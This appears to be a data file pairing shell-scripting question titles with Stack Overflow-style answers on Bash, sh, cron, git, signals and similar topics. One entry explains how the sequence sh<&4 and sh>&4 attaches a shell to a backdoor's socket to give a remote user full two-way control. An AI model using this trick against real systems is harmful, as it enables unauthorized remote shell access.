    "Bash Command-Line Tab Completion Colon Character": "After consulting help-bash@gnu.org I got an answer:\nThe colon breaks words for the completion system (look at the description of the COMP_WORDBREAKS shell variable), so when you type\nprogname :[TAB]\nthe completion system gets an empty word to complete. If all of the possible completions have `:' as the longest common prefix, then the completion system will insert the colon into the line.\nAnd my COMP_WORDBREAKS search yield me an answer from stackoverflow.\nAfter fixing (my missing) /etc/bash_completion file from debian bash completion page, now, my colon-initiated completion is working as my will.",
    "Equivalent of set -o pipefail in Python?": "You can set the pipefail in the calls to system:\ndef do(command):\n  start = datetime.now()\n  return_code = call([ '/bin/bash', '-c', 'set -o pipefail; ' + command ])\n  ...\nOr, as @RayToal pointed out in a comment, use the -o option of the shell to set this flag: call([ '/bin/bash', '-o', 'pipefail', '-c', command ]).",
    "\"Hacking\" a way to a remote shell in 5 characters [closed]": "4 is your connection's file descriptor.\n0 is the program stdin, 1 is the program stdout, 2 is the program stderr, when you created a socket to listen for connections it was then assigned to 3, and when it accepted your connection, a new file descriptor of number 4 was created to handle this connection.\n4 is the ID of the file descriptor of your connection to the backdoor, assuming you are the first one to connect.\nYou then type sh<&4. It opens sh and tell it should get all input directly from your connection.\nRight now you are already in full control of the shell, because sh took over and every command you send is interpreted directly by it. But you still cannot see any output!\nThen you type sh>&4 to open a new level of sh inside the other saying it should push all output to your file descriptor. The trick is done! Two-way communication.",
    "Shell script vs C performance": "I suspect, based on your description, that you're spawning off new processes in your shell script. If that's the case, then that's where your time is going. It takes a lot of OS resource to fork/exec a new process.",
    "How to pass output of grep to sed?": "If the intention is to print the lines that grep returns, generating a sed script might be the way to go:\ngrep -E -o '[0-9]+' error | sed 's/$/p/' | sed -f - error",
    "Simply forking and redirecting the output of a command to /dev/null": "aside: probably want to exec \"$@\" &> /dev/null & in your silent script, to cause it to discard the sub-shell, and the quotes around \"$@\" will keep spaces from getting in the way.\nAs for #2: complete -F _command silent should do something like what you want. (I call my version of that script launch and have complete -F launch in my .bash_profile)",
    "ksh88 changing single quotes to double quotes inside heredocs?": "Here are my notes when I discovered this same bug several years ago.\nTest script:\n#!/bin/ksh\ncat <<EOF\n  $PWD \"$PWD\" '$PWD'\nEOF\necho `cat <<EOF\n  $PWD \"$PWD\" '$PWD'\nEOF\n`\necho $(cat <<EOF\n  $PWD \"$PWD\" '$PWD'\nEOF\n)\nOutput for different shells:\nLinux KSH Version M 1993-12-28 q\nLinux Bash 3.00.15(1)\n(NOTE: works as expected)\n /home/jrw32982 \"/home/jrw32982\" '/home/jrw32982'\n /home/jrw32982 \"/home/jrw32982\" '/home/jrw32982'\n /home/jrw32982 \"/home/jrw32982\" '/home/jrw32982'\nAIX Version M-11/16/88f\nSolaris Version M-11/16/88i\n(NOTE: single quotes replaced with double quotes and variable not substituted)\n /home/jrw32982 \"/home/jrw32982\" '/home/jrw32982'\n /home/jrw32982 \"/home/jrw32982\" '/home/jrw32982'\n /home/jrw32982 \"/home/jrw32982\" \"$PWD\"\nWork-around:\nCompute the single-quoted string externally from the here-file\nabc=xyz\nSTR=\"'$abc'\"\nx=$( cat <<EOF\n  $abc \"$abc\" $STR\nEOF\n)\nUse the here-file in a function instead of directly\nfn() {\n  cat <<EOF\n    $abc \"$abc\" '$abc'\nEOF\n}\nabc=xyz\nx=$(fn)",
    "Bash: search up a directory tree": "This should work but tell me if it needs compatibility with POSIX. The advantage of this is that you don't need to change your directory to higher level just to make the search, and also no need to use a subshell.\n#!/bin/bash\n\nsearch_up() {\n    local look=${PWD%/}\n\n    while [[ -n $look ]]; do\n        [[ -e $look/$1 ]] && {\n            printf '%s\\n' \"$look\"\n            return\n        }\n\n        look=${look%/*}\n    done\n\n    [[ -e /$1 ]] && echo /\n}\n\nsearch_up \"$1\"\nExample:\nbash script.sh /usr/local/bin\nOutput:\n/",
    "Copy files from one user home directory to another user home directory in Linux": "Just this:\ncp -r /home/user1/folder1/ /home/user2/folder2\nIf you add -p (so cp -pr) it will preserve the attributes of the files (mode, ownership, timestamps).\n-r is required to copy hidden files as well. See How to copy with cp to include hidden files and hidden directories and their contents? for further reference.",
    "Ruby, Unicorn, and environment variables": "I think your third possibility is on the right track. What you're missing is the idea of a wrapper script, whose only function is to set the environment and then call the main program with whatever options are required.\nTo make a wrapper script that can function as a control script (if prodEnv use DB=ProdDB, etc), there is one more piece that simplifies this problem. Bash/ksh both support a feature called sourcing files. This an operation that the shell provides, to open a file and execute what is in the file, just as if it was in-lined in the main script. Like #include in C and other languages.\nksh and bash will automatically source /etc/profile, /var/etc/profile.local (sometimes), $HOME/.profile. There are other filenames that will also get picked up, but in this case, you'll need to make your own env file and the explicitly load it.\nAs we're talking about wrapper-scripts, and you want to manage how your environment gets set up, you'll want to do the sourcing inside the wrapper script.\nHow do you source an environment file?\nenvFile=/path/to/my/envFile  \n. $envFile\nwhere envFile will be filled with statements like\ndbServer=DevDBServer\nwebServer=QAWebServer\n....\nyou may discover that you need to export these variable for them to be visble\nexport dbServer webServer\nAn alternate assignment/export is supported\nexport dbServer=DevDBServer\nexport webServer=QAWebServer\nDepending on how non-identical your different environments are, you can have your wrapper script figure out which environment file to load.\ncase $( /bin/hostame ) in\n prodServerName )\n     envFile=/path/2/prod/envFile ;;\n QASeverName )\n     envFile=/path/2/qa/envFile ;;\n devSeverName )\n     envFile=/path/2/dev/envFile ;;\nesac\n\n. ${envFile}\n\n#NOW call your program\nmyProgram -v -f inFile -o outFile ......\nAs you develop more and more scripts in your data processing environment, you can alway source your envFile at the top. When you eventually change the physical location of a server (or it's name), then you have only one place that you need to make the change.\nIHTH",
    "`shell: bash -l {0}` in GitHub Actions": "",
    "Handling of '--' in arguments of /bin/sh: POSIX vs implementations by Bash/Dash/FreeBSD's sh": "The answer to the question \"What does Posix prescribe\" is already present in the OP. But the important feature of the Posix standard is not highlighted: the -c option does not take an argument.\nYou can see this in the Synopsis:\nsh -c [-abCefhimnuvx] [-o option]... [+abCefhimnuvx] [+o option]...\n      command_string [command_name [argument...]]\nWhat the -c flag does is cause the positional parameters (\"operands\") to be interpreted in a different way. Without -c, they are interpreted as [command_file [argument...]]:\nsh [-abCefhimnuvx] [-o option]... [+abCefhimnuvx] [+o option]...\n   [command_file [argument...]]\nThat, by the way, is why sh -c+x is an error. If -c took an argument, then it would be legal to include the argument in the same word.\nSo, to answer the more specific questions:\nPosix says \"A single hyphen shall be treated as the first operand and then ignored...\". Does that apply to a - immediately following -c?\nA: Yes, it does. -c is a complete option, and the - is therefore an operand. By contrast, - in -o - would not be treated as an operand. (It would be treated as an invalid option name.)\nWhich one is right, Dash/Bash or FreeBSD?\nA: In this case, Dash and Bash are Posix-compliant, and FreeBSD's sh is not. FreeBSD's shell considerably predates the current Posix specification, and I don't believe it ever purported to be fully compliant to any Posix specification.\nHow do I portably use sh to run a command whose name begins with a +?\nA: I would think the following would work on any shell:\nsh -c \" +x\"\n\" +x\" will not be recognized as an option because it doesn't start with a + or -, and sh -c causes the operand to be parsed as a shell command, so leading whitespace will be ignored. I don't have a copy of FreeBSD's ash to play with just now, so I welcome corrections.\nOr you could use a simple compound command:\nsh -c \"{ +x; }\"\nPossibly clearest (assuming the shell you're using implements the Posix-standard builtin command) is:\nsh -c \"command +x\"",
    "nohup error no such file or directory": "I think you should give the relative/absolute path of you program\nFor example:\nnohup ./****.sh > /home/user/test.txt",
    "Shell script while read loop executes only once": "Taken from this answer: I now echo nothing into HandbrakeCLI to ensure it's not using the same stdin as my script:\nfind . -name \"*.mkv\" | while read FILE\ndo\n    echo \"\" | handbrake-touch \"$FILE\"\n\n    if [ $? != 0 ]\n    then\n        echo \"$FILE had problems\" >> errors.log  \n    fi\ndone\n...and it works as intended/expected.",
    "Does anybody know what means ShellHook message HSHELL_RUDEAPPACTIVATED?": "HSHELL_RUDEAPPACTIVATED is 32772, which is just HSHELL_WINDOWACTIVATED with the high bit set. From what little I can glean on various Web sites, it appears that Windows sends this message when a full screen app is activated. Kind of hard to tell for sure.\nHave you tried treating that message the same as `HSHELL_WINDOWACTIVATED'?",
    "How to display output of `git branch` on-screen in same CLI terminal? [duplicate]": "This is actually an issue with your pager (probably less these days).\nMost terminal emulators offer the concept of an alternate screen. Opening your editor switches to this alternate screen; text displayed in this screen remains in this screen, and only in this screen. Exiting the editor switches back to the main screen, and the alternate screen text vanishes, so that you're back to your command-line session, without the editor's display cluttering things up. Which is fine if that's what you wanted, and makes some sense when using the editor.\nUnfortunately, the implementation here is to do this switching for everything that uses cursor-addressing modes, and less uses cursor-addressing modes. So this means that piping output through less also switches to the alternate screen.\nThere are numerous work-arounds and fixes. The simplest for less itself is to use the -X option, as described in this bug report and the less documentation:\n-X or --no-init\nDisables sending the termcap initialization and deinitialization strings to the terminal. This is sometimes desirable if the deinitialization string does something unnecessary, like clearing the screen.\nNote that Git defaults to running less -FRX, so if you (a) are using less and (b) are not getting -FRX, check to see if you've overridden the defaults, through core.pager (or $GIT_PAGER) and/or through the environment variable LESS.\nSome users (including myself) really, really hate this alternate-screen switching and wish for our editor output to remain on the screen. Here, a more powerful trick is to disable the alternate screen entirely. This is harder, however. See, e.g., How can you turn off alternate screen in OSX's Terminal.app? Some people really, really like this behavior and want to turn it on when it's off: see, e.g., screen: how to turn on alternate screen? (which has more links to how to turn it off).\n(I use the \"decompile the terminfo, edit out the alt-screen escape sequences, and compile my own terminfo\" method myself.)",
    "Git: How to auto update my local branch when a change happens in remote tracking branch?": "If you don't have control on the remote repository, one solution is to use crontab to run periodically git fetch or maybe even a git pull --rebase as you propose. The exact command to choose depends on your workflow, personally I prefer to use a git fetch because I can decide when and how to merge or rebase.\nTo run the command periodically run:\ncrontab -e\nAnd add a line such as:\n* * * * * git -C PATH_TO_LOCAL_REPO fetch\nor\n* * * * * git -C PATH_TO_LOCAL_REPO pull --rebase\nThis will run the git command every minutes with your user permissions.\nIf you want to apply the git command on a list of repository, you can can add the line:\n* * * * * /home/myself/scripts/git-refresh.sh\nwhere git-refresh is a script that apply on all your repositories.\nThe -C option allows you to run a git command without changing directory. From the man page:\n-C <path>\nRun as if git was started in \"path\" instead of the current working directory.",
    "Does changing Perl 6's $*OUT change standard output for child processes?": "By default the IO::Handle that is in $*OUT is bound to the low-level STDOUT filehandle given by the operating system.\nshell and run just let the spawned process use the low-level STDOUT file that was given to Perl 6, unless you specify otherwise.\nPerl 6 doesn't change anything about the outside environment until the moment before it spawns a new process.\nThe simplest thing to do is to give the filehandle object you want to use to the shell or run call with a named argument.\n# no testing for failure because the default is to throw an error anyway\n\nmy $p6-name = 'in-out.p6'.IO;\nEND $p6-name.unlink;\n\n$p6-name.spurt(Q'put \"STDOUT: @*ARGS[0]\";note \"STDERR: @*ARGS[0]\"');\n\nrun $*EXECUTABLE, $p6-name, 'run', :out(open '/dev/null', :w);\n\n{\n  temp $*OUT = open '/dev/null', :w;\n  shell \"'$*EXECUTABLE' '$p6-name' 'shell'\", :err($*OUT);\n}\nThis results in\nSTDERR: run\nSTDOUT: shell\nIn the particular case of throwing away the output data, :!out or :!err should be used instead.\nrun $*EXECUTABLE, $p6-name, 'no STDERR', :!err;\nSTDOUT: no STDERR\nIf you just want the data to be intercepted for you :out and :err do just that;\nmy $fh = run( $*EXECUTABLE, $p6-name, 'capture', :out ).out;\nprint 'captured: ',$fh.slurp-rest;\ncaptured: STDOUT capture",
    "How to change directory in mysql command line tool?": "If you start the MySQL command line tool from the terminal, your working directory will be wherever you executed the binary from. For example in Windows, start the command prompt and then run the following:\ncd \"C:\\my scripts path\\\"    \n\"C:\\Program Files (x86)\\MySQL\\MySQL Server 5.7\\bin\\mysql\" -u root -p rootpassword\nNow, you can execute source commands and just pass the script name rather than the entire absolute path. This is super useful for nesting scripts while using relative paths.\n(I'm pretty certain this works in Linux too, but I only tested in Windows.)",
    "\"I have no name!\" as user logging into Jenkins in a docker container that uses Tini": "",
    "How can one create a polyglot PDF?": "I played around with polyglots myself after attending Ange's talks and also talking to him in person. You really need to understand the file formats to be able to nest them into each other.\nHowever, long story short, here are some links I found extremely useful for creating polyglots:\nSome older Google Code Trunk\nPoC of the polyglot stuff\nEspecially the second link (to github) will help you creating polyglots, but also understanding how they are working and how they are implemented. Since it is mostly Python stuff and very well / clean written, it is very useful and easy to follow.",
    "Change global positional parameters inside a Bash function": "As stated before, the answer is no, but if someone need this there's the option of setting an external array (_ARRAY), modifying it from within the function and then using set -- ${_ARRAY[@]} after the fact. For example:\n#!/bin/bash\n\n_ARGS=()\n\nshift_globally () {\n  shift\n  _ARGS=$@\n}\n\necho \"before: \" \"$@\"\nshift_globally \"$@\"\nset -- \"${_ARGS[@]}\"\necho \"after: \" \"$@\"\nIf you test it:\n./test.sh a b c d\n> before:  a b c d\n> after:  b c d\nIt's not technically what you're asking for but it's a workaround that might help someone who needs a similar behaviour.",
    "Variable scope for bash shell scripts and functions in the script": "You can try something like\nglobal1=0\nglobal2=0\nstart_read=true\n\nfunction testfunc {\n   global1=9999\n   global2=1111\n   echo \"in testfunc\"\n   echo $global1\n   echo $global2\n   duration=something\n}\n\nfile1=whocares\nfile2=whocares2\n\nfor line in `cat $file1`\ndo\n   for i in `grep -P \"\\w+ stream\" $file2 | grep \"$line\"`   # possible but unlikely problem spot\n   do\n         end=$(echo $i | cut -d ' ' -f 1-4 | cut -d ',' -f 1)   # possible but unlikely spot\n         testfunc $end       # more likely problem spot\n   done\ndone\n\necho \"global1 = $global1\"\necho \"global2 = $global2\"",
    "Bash not trapping interrupts during rsync/subshell exec statements": "How about just having all the output from point X be redirected to tee without having to repeat it everywhere and mess with all the sub-shells and execs ... (hope I didn't miss something)\n#!/bin/bash\nlogfile=/path/to/file;\ndirectory1=/path/to/dir\ndirectory2=/path/to/dir\n\nexec > >(exec tee -a $logfile) 2>&1\n\ncleanup () {\n     echo \"Cleaning up!\"\n     #do stuff\n     trap - EXIT \n}\ntrap cleanup EXIT\n\nsleep 10\nrsync --progress -av --delete $directory1 /var/tmp/$directory2",
    "Merging Mercurial conflicts on command line?": "As Cesar mentioned, you need a merge tool. If you are familiar with vim, I suggest vimDiff.\nAlso, don't worry, you didn't lose any data or did anything wrong. Just setup some merge tool, use hg update -C to start from clean slate. Proceed with hg merge.",
    "Using sed on a compressed file": "Well you either can have more speed (i.e. use uncompressed files) or more free space (i.e. use compressed files and the pipe you showed)... sorry. Using compressed files will always have an overhead.",
    "Expect Script - Fixing weird terminal resizing behaviour": "When you call spawn inside a procedure the array variable spawn_out(slave,name) has the scope of that procedure only. Usually, you can just make this into a global scope by declaring it as such inside each procedure:\nproc s1 {...} {\n  global spawn_out\n  ...\n  spawn ...\n}\nsend_user $spawn_out(slave,name)",
    "Emacs open another shell in current window": "Emacs runs interactive shells in dedicated buffers. It cannot run a shell in, say, TeX buffer.\nM-x shell creates a new shell if there isn't one already, and C-u M-x shell asks you for the name of a new buffer. You can also rename the shell buffer to facilitate multiple shells, see the link above.\nEDIT: the new shell buffer is displayed using pop-to-buffer-same-window (in Emacs24). Your best venue is to add *Shell* to display-buffer-alist - but it is not necessary there.\nIn Emacs23 the display of the *Shell* buffer is controlled by special-display-function (since *Shell* has a match in special-display-buffer-names or special-display-regexps). Set special-display-function to display-buffer-same-window (or something similar) and you should be golden.\nHowever, the ultimate solution is to upgrade Emacs to v24; since you are on a linux system, it should be straightforward.",
    "Java, Runtime.exec or ProcessBuilder: how to know if the file is shell or binary?": "It should be a red flag that you have to jump through these hoops just to run a command. First because this is getting really complicated, and second because Java was designed to be platform independent. When you are investigating OS-specific hacks to make built-in classes work you should step back and re-examine your assumptions.\nProcessBuilder pb = new ProcessBuilder(\"script.sh\", \"arg1\", \"arg2);\n(error 2: file not found)\nNotice that the error message is \"file not found\", not \"cannot execute shell script\" or some such error. The most likely cause for this error is not that you're executing a script, but that the script can't be found.\nIf the script is in the current directory then you need to add a ./ in front. If you don't put an explicit path to the executable then the executable must reside in one of the directories in your $PATH environment variable. The current directory . is usually not included in $PATH by default.\nProcessBuilder pb = new ProcessBuilder(\"./script.sh\", \"arg1\", \"arg2);\nIf the script name is a user-supplied value then I would levy this requirement on the user--you could add the ./ for them, but UNIX programs generally try to avoid being too helpful. If they forget to put ./ then that's their problem!",
    "Regex to replace last occurrence of a string in each line": "You need to add 'g' to the end of your sed:\nsed -e 's/\\(.*\\)ABC/\\1DEF/g'\nThis tells sed to replace every occurrence of your regex (\"globally\") instead of only the first occurrence.\nEDIT: You should also add a $, if you want to ensure that it is replacing the last occurrence of ABC on the line:\nsed -e 's/\\(.*\\)ABC$/\\1DEF/g'",
    "Can my vps_ip be set as a proxy to let wget use with?": "http://www.baidu.com/search?q=wget+socks+proxy\nhttps://unix.stackexchange.com/questions/38755/how-to-download-a-file-through-an-ssh-server\nOption 1, with the use of socksify from the security/dante package:\nsudo pkg_add dante\n\nssh -N -C -D 1080 root@$vps_ip &\n\nSOCKS_SERVER=localhost:1080 socksify wget -c $url -O /home/material\nOption 2, by piping the download through stdout / stdin:\nssh -C root@$vps_ip \"wget -O- $url\" >> /home/material",
    "Get logged on username in Excel VBA - not the account running Excel (using RunAs)": "The basic approach is to execute the shell with a \"run as\" parameter.\nhave you taken a look at this\nalso look here\nThis is code ripped from the ms sight and is just here to make sure that the next guy or gal who comes by has a quick reference.\nSub RegisterFile(ByVal sFileName As String)\nShellExecute 0, \"runas\", \"cmd\", \"/c regsvr32 /s \" & \"\"\"\" & sFileName & \"\"\"\", \"C:\\\", 0 'SW_HIDE =0\nEnd Sub\nAs an aside if you only need the account for access to a SQL server, you should be able to just set the account within the connection string in your vba MACRO. I've done that for an Oracle DB in the past.",
    "Not receiving SIGCHLD for processes executed with sudo": "My first thought is incorrect signal processing but there is not enough information in your post to write test code to replicate your failure. But I can give you some places to look. Pardon me if I cover a few signal basics you already know for future readers.\nFirst of all I do not know if you are using the legacy signal() or the new POSIX sigaction() signal routines to catch signals. sigset() is a useful in between from GNU.\nLegacy Signals -- signal()\nIt's near impossible, if not impossible, to guarantee an air-tight signal processor using the original signal processor in all environments.\nOn some UNIX systems entering the signal handler can reset the handler to the default condition. Subsequent signals are guaranteed to be lost unless the handler explicitly reset the signal.\nsignal() handlers must not assume they get called once for each signal.\nHandlers must do a while( ( pid = waitpid( -1, &signal, WNOHANG ) ) > 0 ) loop, until no more signals are found as legacy signals set a bool condition indicating at least one signal is outstanding. The actual count is unknown.\nHandlers must allow for no signals being found if a prior while() loop processed the signal.\nAllow for signals from unknown processes... if the program you start also starts a grandchild process you may inherit that process if your child exits quickly.\nAdvice, hold your nose and flee from legacy signals.\nLack of a while() loop in a legacy handler and multiple SIGCHILDs, one from your sudo and one or more from unexpected grandchildren fired off by sudo. If only one SIGCHILD is handled when a grandchild signal comes in first, the expected program's signal will not be caught.\nPOSIX Signals -- sigaction()\nPOSIX signals can clean up all of the failures of legacy signals.\nSet a handler, without a restore (restore is NOT part of POSIX signals and is often, at least in my mind, evil when you might get more than one signal to handle in the same way).\nsigaction() signals are sticky... they live until expressly changed (wonderful!). None of this troublesome requirement of having to reset the signal handler again in the handler.\nSet a mask to mask out the current signal when processing the signal. Paranoids will also mask any other signal passed to the same handler.\nLack of a mask can cause weird stuff like loosing track of a signal if you get a SIGCHILD while in a SIGCHILD handler.\nGNU -- sigset()\nGNU provides an useful in-between that has the same calling signatures as signal() but removes most of the problems. Some additional control functions are also available. Using sigset() is an easy fix for many signal problems.\nReminders\nThink of signal handlers as threads in your program, even if you are not otherwise using threads in the code.\nIn days of old you needed to do absolutely minimal processing in signal handlers... no calling of library code, such as printf, that have side effects. I still follow this when having to use legacy signal handlers and always use multithread cautions in newer handlers.",
    "Why does foreground job ignore job control signals when Bash is running as PID 1?": "In linux, processes are given default signal handlers. A variety of signals (like SIGTERM and SIGINT), have the default behavior of immediately exiting.\nFor historical and system reasons, pid 1 just does not get these default signal handlers defined, so there's no behavior there. Note that this doesn't stop you from redefining signal handlers yourself.\nFrom the linux kernel man pages\nOnly signals for which the \"init\" process has established a signal handler can be sent to the \"init\" process by other members of the PID namespace. This restriction applies even to privileged processes, and prevents other members of the PID namespace from accidentally killing the \"init\" process.\nLikewise, a process in an ancestor namespace can\u2014subject to the usual permission checks described in kill(2)\u2014send signals to the \"init\" process of a child PID namespace only if the \"init\" process has established a handler for that signal. (Within the handler, the siginfo_t si_pid field described in sigaction(2) will be zero.) SIGKILL or SIGSTOP are treated exceptionally: these signals are forcibly delivered when sent from an ancestor PID namespace. Neither of these signals can be caught by the \"init\" process, and so will result in the usual actions associated with those signals (respectively, terminating and stopping the process).",
    "Jenkinsfile: permission denied when running sh step in Docker container": "",
    "Can the at command in rest be simplified?": "at and batch read commands from standard input or a specified file which are to be executed at a later time, using /bin/sh.\nman at\nSo, you can feed it commands with a HEREDOC, like this:\nrest(){\n    echo \"have a rest in \"$1 \" minutes\"\n    at now+$1 minutes <<EOF\n    xscreensaver-command --lock\nEOF\n}\n(note that the limit string EOF can not have any whitespace in front of it)",
    "How to make the up and down arrow keys show history entries in a script using zsh?": "I think you're asking for something along these lines... untested\n#! /bin/zsh -i\n\nlocal HISTFILE\n# -p push history list into a stack, and create a new list\n# -a automatically pop the history list when exiting this scope...\nHISTFILE=$HOME/.someOtherZshHistoryFile\nfc -ap # read 'man zshbuiltins' entry for 'fc'\n\nwhile IFS=\"\" vared -p \"input> \" -c line; do \n   print -S $line # places $line (split by spaces) into the history list...\ndone\n[EDIT] Notice I added -i to the first line (#!). It is merely a way to indicate that the shell must be running in interactive mode. The best way to achieve this is to simply execute the script with zsh -i my-script.zsh, because passing arguments to #! commands differs between Linux and OSX, so it is in principle something one should not rely on.\nHonestly, why don't you just start a new interactive shell using some custom configuration and (should it be necessary) hooks between commands? The best way to achieve this is likely to just start a new shell using different config files a new history.\nThis is a much better way to do this:\n mkdir ~/abc\n echo \"export HISTFILE=$HOME/.someOtherZshHistoryFile;autoload -U compinit; compinit\" >! ~/abc/.zshrc\n ZDOTDIR=~/abc/ zsh -i\nyou can then change the script's config file to perform any other customisation you need (different color prompt, no history saving etc).\nTo actually do things with the user input, you should use one of the many hooks handled by add-zsh-hook",
    "How to get all fields in outer join with Unix join?": "Here is a solution that might or might not work for your data. It approaches the problem by aligning the records within a csv file by line number, i.e. record 2 ends up on line 2, record 3123 on line number 3123 and so on. Missing records/lines are padded with MISSING fields, so the input files would be mangled to look like this:\nen.csv:\n1,dog,red,car\n2,MISSING,MISSING,MISSING\n3,cat,white,boat\nde.csv:\n1,Hund,Rot,Auto\n2,Kaninchen,Grau,Zug\n3,MISSING,MISSING,MISSING\nsp.csv:\n1,MISSING,MISSING,MISSING\n2,conejo,gris,tren\n3,gato,blanco,bote\nFrom there it is easy to cut out the columns of interest and just print them side-by-side using paste.\nTo achieve this, we sort the input files first and then apply some stupid awk magic:\nIf a record appears on their expected line number, print it\nOtherwise, print as many lines containing the number of expected (this is based on the number of fields of the first line in the file, same as what join -o auto does) MISSING fields until the alignment is correct again\nNot all input files are going to the same number of records, so the maximum is searched for before all of this. Then, more lines with MISSING fields are printed until the maximum is hit.\nCode\nreccut.sh:\n#!/bin/bash\n\nget_max_recnum()\n{\n    awk -F, '{ if ($1 > max) { max = $1 } } END { print max }' \"$@\"\n}\n\nalign_by_recnum()\n{\n    sort -t, -k1 \"$1\" \\\n        | awk -F, -v MAXREC=\"$2\" '\n            NR==1 { for(x = 1; x < NF; x++) missing = missing \",MISSING\" }\n            {\n                i = NR\n                if (NR < $1)\n                {\n                    while (i < $1)\n                    {\n                        print i++ missing\n                    }\n                    NR+=i\n                }\n            }1\n            END { for(i++; i <= MAXREC; i++) { print i missing } }\n            '\n}\n\n_reccut()\n{\n    local infiles=()\n    local args=( $@ )\n    for arg; do\n        infiles+=( \"$2\" )\n        shift 2\n    done\n    MAXREC=\"$(get_max_recnum \"${infiles[@]}\")\" __reccut \"${args[@]}\"\n}\n\n__reccut()\n{\n    local cols=\"$1\"\n    local infile=\"$2\"\n    shift 2\n\n    if (( $# > 0 )); then\n        paste -d, \\\n            <(align_by_recnum \"${infile}\" \"${MAXREC}\" | cut -d, -f ${cols}) \\\n            <(__reccut \"$@\")\n    else\n        align_by_recnum \"${infile}\" \"${MAXREC}\" | cut -d, -f ${cols}\n    fi\n}\n\n_reccut \"$@\"\nRun\n$ ./reccut.sh 3 en.csv 2,4 sp.csv 3 de.csv\nred,MISSING,MISSING,Rot\nMISSING,conejo,tren,Grau\nwhite,gato,bote,MISSING",
    "launching background process in capistrano task": "Try forking the process as explained here: Spawn a background process in Ruby\nYou should be able to do something like this:\njob1 = fork do\n  run \"svscanboot\"\nend\n\nProcess.detach(job1)\nAs well, checkout this: Starting background tasks with Capistrano",
    "cronjob error in OSX: \"no path for address\"": "try to create file like message.sh inside it run your .py file\n#!/bin/sh\npython path/to/python_script.py\nand make this file executable with chmod a+x message.sh\n*/1 11-17 * * 1-7 path/to/message.sh 2>&1",
    "How to decode value in redis cli or shell script": "TL;DR: You'll need to convert the escaped binary strings back to binary to decode.\nAn older question, but still valid today. The key's value contains binary, so Redis is showing you an escaped version of the string to make it printable in the terminal.\nThe non-printable characters are notated with the \\x and then two hex character representing the non-printable 8 bits. We can also tell that the values in your example are gzip encoded, because the magic number prefix of \\x1f\\x8b (aka 1f 8b).\nExample to recreate:\nFirst, create a new binary blob, we'll use gzip again for the example (-n means no tailing newline character):\necho -n \"hello world\" | gzip > test.gz\nIf we cat the binary, the shell can't render it properly and it'll look like this:\ncat test.gz\n\ufffd%f\ufffdH\ufffd\ufffd\ufffdW(\ufffd/\ufffdI\ufffdJ\nInstead, lets use python, to view the escaped binary string (note the b prefix in the result tells us it's a binary string):\npython3 -c \"print(open('test.gz','rb').read())\"\nb'\\x1f\\x8b\\x08\\x00\\xa1%\\x0ff\\x00\\x03\\xcbH\\xcd\\xc9\\xc9W(\\xcf/\\xcaI\\x01\\x00\\x85\\x11J\\r\\x0b\\x00\\x00\\x00'\nNext we send that binary (gzip data) blob to Redis (-x to read from stdin):\nredis-cli -x set example-key001 < test.gz\nOK\nIf we get our key now, we'll see the familuar escaped string that python printed above:\nredis-cli get example-key001\n\"\\x1f\\x8b\\b\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\xcbH\\xcd\\xc9\\xc9W(\\xcf/\\xcaI\\x01\\x00\\x85\\x11J\\r\\x0b\\x00\\x00\\x00\"\nTo retrieve the original uncompressed text value from the key, we can get the raw key and pass value directly to gzip to decompress (I added tr here as redis-cli --raw still appends newlines):\nredis-cli --raw get example-key001 | tr -d '\\n' | gzip -d\nhello world\nPS in the comments Mr. bug mentioned the echo -e and pointed out this isn't part of posix. Unfortunately, the link to the chat is long since broken to see the rest of the conversation, but he's also correct. echo is a shell built in, so using #!/bin/sh means that there is no echo -e. You can use #!/usr/bin/env bash to use bash, and it's more portable than assuming bash is always installed in /bin.\nHere's an example of what he was saying:\n#!/usr/bin/env bash\n\necho -n -e '\\x1f\\x8b\\b\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\xcbH\\xcd\\xc9\\xc9W(\\xcf/\\xcaI\\x01\\x00\\x85\\x11J\\r\\x0b\\x00\\x00\\x00' > bin.gz\ngzip -d < bin.gz\nhello world",
    "Why does posh fail to perform pathname expansion when a part of the path is specified within double-quotes?": "This is a bug in posh -- see bug #636601. It is still open as of posh version 0.12.6.\nAttached to the discussion of that bug you'll find a patch. When applying that, posh behaves similar to bash (so in your first example echo \"bar\"/* gives bar/baz).\nFurthermore, that behaviour of bash (and patched posh) does conform to POSIX. The standard says\nQuote removal (see Quote Removal) shall always be performed last.\nThis is meant literally, as a purely syntactical action to remove protective quotes in the very last step. The semantical meaning of quotes will still apply in earlier steps, as pointed out by hek2mgl. (Otherwise, e.g. a quotation like \"*\" would not have any effect at all.)\nSo on second thought, this conclusion is not correct:\nConsidering this, the posh behaviour looks right because \"bar\"/* does not literally match any path above before the quote removal, so path expansion does not occur.",
    "iconv \"incomplete character or shift sequence at end of buffer\" error": "Try to use iconv with -c option.\nI should have one or more characters incompatible with your input charset \"UCS-2\"",
    "X11 Dependency, Compile Dbus without X11, starting only Shell C++ Applications Raspbian Linux": "Great post. You obviously had more diligence than I; I ended up running a display buffer instead.\nbut one question is left, how can i do it automatically?\nSince\n$dbus-launch \noutputs the bus info to standard out, did you try just running the program after? For instance\n$dbus-launch ./server\nThe dbus-launch man page says:\nYou may specify a program to be run; in this case, dbus-launch will launch a session bus instance, set the appropriate environment variables so the specified program can find the bus, and then execute the specified program, with the specified arguments. See below for examples.\nIf you launch a program, dbus-launch will not print the information about the new bus to standard output.",
    "need a shell script to convert big endian to little endian": "Just had to do this... but from decimal to little endian.. adapting that here:\necho 00d66d7e | tac -rs .. | echo \"$(tr -d '\\n')\"\nachieves the desired result, for arbitrarily sized hexadecimal representations of unsigned integers.\n(h/t 'tac -rs' MestreLion, very nice!)",
    "Is it possible to make a bash shell script interact with another command line program?": "If your command doesn't care how fast you give it input, and you don't really need to interact with it, then you can use a heredoc.\nExample:\n#!/bin/bash\nprog <<EOD\ncmdx\nsave filex\ncmdy\nsave filey\nq\nEOD\nIf you need branching based on the output of the program, or if your program is at all sensitive to the timing of your commands, then Expect is what you want.",
